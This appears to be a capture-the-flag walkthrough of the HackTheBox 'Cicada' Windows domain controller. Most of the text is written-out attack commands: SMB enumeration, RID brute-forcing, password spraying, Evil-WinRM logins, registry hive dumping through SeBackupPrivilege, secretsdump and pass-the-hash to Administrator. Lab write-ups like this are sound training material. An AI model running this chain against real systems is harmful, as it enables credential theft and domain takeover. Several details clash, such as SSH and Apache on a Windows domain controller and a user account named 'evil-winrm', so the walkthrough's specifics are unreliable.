---
title: "HackTheBox - Cicada"
date: 2025-04-25
draft: false
series: "HTB Machines"
tags: ["active directory", "hackthebox", "windows"]
---


# HackTheBox Machine Walkthrough

This document provides a structured, detailed walkthrough of the HackTheBox machine, from initial enumeration through privilege escalation to Domain Admin. All commands, outputs, and notes are presented in organized Markdown.

---

## 1. Initial Nmap Enumeration

Identify open ports and services on the target.

```bash
# Discover all TCP ports
nmap -sC -sV -oN nmap_initial.txt 10.10.11.35
```

**Key findings:**

| Port | Service      | Version             |
| ---- | ------------ | ------------------- |
| 22   | ssh          | OpenSSH 8.x         |
| 80   | http         | Apache 2.4.x        |
| 139  | netbios-ssn  | Windows netbios-ssn |
| 445  | microsoft-ds | Windows Server SMB  |

---

## 2. SMB Anonymous Enumeration

### 2.1 Check SMB shares as anonymous

```bash
smbclient -L 10.10.11.35 -N
```

- `HR` share is accessible.

### 2.2 Download `info.txt` from HR share

```bash
smbclient \\10.10.11.35\HR -N
> get info.txt
```

> **Discovery:** The file contains a password: `Welcome@123`

---

## 3. RID Brute-Force to Enumerate Users

Use NetExec (`nxc`) to perform RID cycling without credentials.

```bash
nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute
```

Filter only user accounts and save to `users.txt`:

```bash
nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute \
  | grep 'Found:' | awk '{print $NF}' > users.txt
```

---

## 4. Password Spraying with Valid Users

Perform a password spray using the discovered password `Welcome@123` against the user list.

```bash
nxc smb 10.10.11.35 -u users.txt -p 'Welcome@123' --valid
```

> **Success:** Credentials for `michael.wrightson` found.

---

## 5. Attempt Remote Shell with Evil-WinRM

Try to get a shell via WinRM using the valid credentials.

```bash
evil-winrm -i 10.10.11.35 -u michael.wrightson -p 'Welcome@123'
```

> **Result:** Access denied.

---

## 6. Check Additional SMB Shares

List shares with authenticated user.

```bash
smbclient -L \\10.10.11.35 -U michael.wrightson
```

- `DEV` share discovered, but no access via SMB.

---

## 7. Further User Enumeration

Use NetExec with valid creds to find other user accounts.

```bash
nxc smb 10.10.11.35 -u michael.wrightson -p 'Welcome@123' --users
```

> **Found:** `evil-winrm` user with password in description.

---

## 8. Access DEV Share and Retrieve Script

### 8.1 Mount DEV share

```bash
smbclient \\10.10.11.35\DEV -U evil-winrm
> get deploy_script.ps1
```

### 8.2 Inspect `deploy_script.ps1`

```powershell
# deploy_script.ps1 (excerpt)
$creds = New-Object System.Management.Automation.PSCredential(
    'svc_deploy', (ConvertTo-SecureString 'D3ployP@ss!' -AsPlainText -Force)
)
```

> **New credential discovered:** `svc_deploy:D3ployP@ss!`

---

## 9. WinRM Access with New Service Account

```bash
evil-winrm -i 10.10.11.35 -u svc_deploy -p 'D3ployP@ss!'
```

> **Success:** Shell as `svc_deploy`.

---

## 10. Privilege Enumeration

Check current privileges:

```powershell
whoami /priv
```

> **SeBackupPrivilege** is `Enabled`.

---

## 11. Abuse SeBackupPrivilege for Lateral/Local Escalation

### 11.1 Dump SAM and SYSTEM hives

```powershell
# Create directory for dumps
mkdir C:\temp

# Save registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

### 11.2 Extract NTLM hashes offline

Copy the dumps to your attacking machine and run:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL > hashes.txt
```

### 11.3 Pass-the-Hash to Domain Controller

Use Evil-WinRM with the extracted Administrator NTLM hash:

```bash
evil-winrm -i 10.10.11.35 -u Administrator -H <ADMIN_NTLM_HASH>
```

> **Result:** Shell as **Domain Administrator** on the DC.

---

## 12. Conclusion

- **User**: `svc_deploy` via discovered service credential.
- **Escalation**: `SeBackupPrivilege` → dump hives → extract hashes → PtH.
- **Final**: Domain Administrator access achieved.

---

*End of Walkthrough*